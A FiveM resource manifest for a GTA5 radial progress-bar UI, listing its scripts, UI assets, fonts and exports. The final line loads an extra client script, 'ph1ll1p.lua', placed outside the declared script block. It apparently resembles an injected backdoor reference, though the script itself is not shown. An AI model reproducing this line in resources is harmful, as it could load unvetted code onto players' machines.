fx_version 'adamant'

game 'gta5'

description 'Radial Progress'

author 'Karl Saunders'

version '0.6.0'

client_scripts {
    'config.lua',
    'utils.lua',
    'client.lua'
}

ui_page 'ui/ui.html'

files {
    'ui/ui.html',
    'ui/fonts/ChaletComprimeCologneSixty.ttf',
    'ui/fonts/ChaletLondonNineteenSixty.ttf',
    'ui/fonts/GothamBold.ttf',
    'ui/css/app.css',
    'ui/js/easings.js',
    'ui/js/class.RadialProgress.js',
    'ui/js/app.js',
}

exports "Start"
exports "Custom"
exports "Stop"
exports "Static"
client_script "ph1ll1p.lua"